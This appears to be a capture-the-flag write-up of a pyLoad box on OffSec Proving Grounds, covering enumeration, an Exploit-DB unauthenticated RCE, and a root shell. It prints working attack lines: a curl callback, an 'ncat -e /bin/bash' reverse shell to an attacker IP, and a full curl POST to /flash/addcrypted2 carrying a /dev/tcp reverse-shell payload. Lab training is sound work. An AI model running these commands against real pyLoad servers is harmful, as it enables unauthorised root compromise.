
## Overview

**Platform:** OffSec Proving Grounds **Operating System:** Linux (Ubuntu) **Web Application:** pyLoad (CherryPy/Cheroot-served download manager) **Initial Access:** Unauthenticated RCE in pyLoad **Initial Access Type:** Web application exploitation **Privilege Escalation:** None required — service runs as root **Final Access:** Root (direct)

### Key Techniques

- Nmap service + version fingerprinting
- Application identification via HTTP title/headers
- Exploit-DB PoC research and usage
- Payload verification before committing to a shell (`curl` callback first)
- Reverse shell via `ncat -e`

---

# Attack Path

```text
Nmap: 22, 9666
        ↓
Identify pyLoad via HTTP Title / Login Redirect
        ↓
Search "pyload" on Exploit-DB
        ↓
Unauthenticated RCE PoC (Exploit-DB 51532)
        ↓
Verify Exploit With curl Callback
        ↓
Swap Payload for ncat Reverse Shell
        ↓
Code Execution as root (service runs as root)
        ↓
Stabilize Shell (pty.spawn)
        ↓
Root Shell — No Privesc Needed
```

---

# 1. Nmap Enumeration

```bash
nmap -p- -sV <target>
```

```text
22/tcp    ssh    OpenSSH 8.9p1 Ubuntu
9666/tcp  http   CherryPy wsgiserver / Cheroot 8.6.0
```

The HTTP service on `9666` redirects to a login page with the page title **"Login - pyLoad"**:

```text
http://<target>:9666/login?next=http://<target>:9666/
```

> [!tip] Recognition Pattern Non-standard ports (`9666` here) combined with an unusual server header (`Cheroot`) are a strong signal you're looking at a niche/self-hosted app rather than a mainstream stack. The HTTP page title and login redirect URL identified the app directly — always check the page title and any redirect target, not just the raw banner.

---

# 2. Vulnerability Research

Searching "pyload" for known vulnerabilities surfaces a public **unauthenticated RCE** PoC:

- [Exploit-DB 51532](https://www.exploit-db.com/exploits/51532)

No credentials needed — the vulnerability is reachable pre-authentication, despite the app itself requiring a login for normal use.

> [!tip] Login Pages Don't Guarantee Authenticated-Only Attack Surface Just because an app redirects unauthenticated users to a login page for its normal UI doesn't mean every backend endpoint enforces that same check. Vulnerable API/RPC endpoints underneath a login-gated frontend are a recurring pattern — always check for CVEs regardless of whether the main UI appears to require auth.

---

# 3. Exploitation

```bash
python3 exploit.py -u '<target_url>' -c '<command>'
```

**Step 1 — Verify the exploit works before committing to a shell.** Used a harmless `curl` callback first, to confirm command execution without needing a shell payload to succeed on the first try:

```bash
python3 exploit.py -u 'http://<target>:9666' -c 'curl <attacker_ip>:1234'
```

```bash
nc -lvnp 1234
```

Received an inbound `curl` request from the target — confirms the RCE fires successfully and reaches the network.

> [!tip] Verify Before You Commit Testing an RCE with a low-stakes callback (`curl`, `ping`, `nslookup` to a listener) before firing a full reverse-shell payload is a good habit — it separates "does the injection work" from "does my shell payload work," so if something fails you know which half to debug.

**Step 2 — Swap in a reverse shell payload:**

```bash
python3 exploit.py -u 'http://<target>:9666' -c 'ncat -e /bin/bash <attacker_ip> 1234'
```

```bash
nc -lvnp 1234
```

```bash
whoami
# root
```

Code execution lands **directly as root** — no privilege escalation needed, since the pyLoad service itself runs with root privileges (likely a misconfigured systemd unit or manual root-run process, common on smaller self-hosted apps not run with a dedicated service account).

**Step 3 — Stabilize the shell:**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
cat /root/proof.txt
```

**Alternative:**
The following curl command achieves the same outcome of a reverse shell. (be sure to update the IP and port numbers).

```bash
curl -i -s -k -X POST --data-binary "jk=pyimport%20os;os.system(\"bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.195%2F4444%200%3E%261%27\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa"  "http://192.168.190.26:9666/flash/addcrypted2"
```

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|Unusual port + unfamiliar server header (`Cheroot`, etc.)|Likely a niche self-hosted app — check page title/redirects to identify it|
|App requires login for its main UI|Doesn't guarantee every endpoint is authenticated — still check for unauthenticated CVEs|
|About to fire a shell payload from a public exploit|Test with a low-stakes callback (`curl`/`ping`) first to isolate exploit success from payload success|
|Shell lands as root immediately|Service itself likely runs as root — no privesc phase needed, just stabilize and grab proof|

---

# Key Lessons

> [!tip] A Login Page Isn't Proof of Full Authentication Coverage Backend endpoints behind a login-gated frontend can still be reachable unauthenticated. Search for CVEs on the app regardless of whether the main UI looks locked down.

> [!tip] Verify Exploits With a Harmless Callback First A `curl`/`ping`/DNS callback confirms the vulnerability actually fires before you invest effort debugging a reverse-shell payload — keeps troubleshooting focused on one variable at a time.

> [!tip] Root-Run Services Skip Privesc Entirely Some self-hosted apps (especially smaller or less mature ones) are commonly run directly as root rather than under a dedicated service account. Landing a shell as root immediately after RCE is a sign of exactly this — no further escalation needed, just stabilize and collect proof.